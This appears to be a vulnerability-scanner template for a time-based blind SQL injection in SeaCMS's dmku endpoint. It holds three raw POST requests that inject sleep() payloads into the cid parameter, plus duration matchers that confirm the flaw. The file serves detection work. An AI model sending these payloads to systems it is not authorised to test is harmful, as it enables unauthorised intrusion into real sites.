
id: SeaCMS-cid-sqli
info:
  name: SeaCMS-dmku-sqli
  author: apple
  severity: high
  description: SeaCMS海洋影视管理系统dmku存在SQL注入漏洞
  reference:
    - https://github.com/wy876/POC/commit/8aba209f09b30c6ed67d508c68542549c637df1b
  tags: tags
http:
  - raw:
      - |-
        POST /js/player/dmplayer/dmku/index.php?ac=edit HTTP/1.1
        Host: {{Hostname}}
        Cookie: PHPSESSID=hlfl5flck9q3ng1blehhv86s4s
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Cache-Control: max-age=0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9

        cid=(select(1)from(select(sleep(3)))x)&text=1&color=1
      - |-
        POST /js/player/dmplayer/dmku/index.php?ac=edit HTTP/1.1
        Host: {{Hostname}}
        Cookie: PHPSESSID=hlfl5flck9q3ng1blehhv86s4s
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Cache-Control: max-age=0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9

        cid=(select(1)from(select(sleep(6)))x)&text=1&color=1
      - |-
        POST /js/player/dmplayer/dmku/index.php?ac=edit HTTP/1.1
        Host: {{Hostname}}
        Cookie: PHPSESSID=hlfl5flck9q3ng1blehhv86s4s
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Cache-Control: max-age=0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9

        cid=(select(1)from(select(sleep(9)))x)&text=1&color=1
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"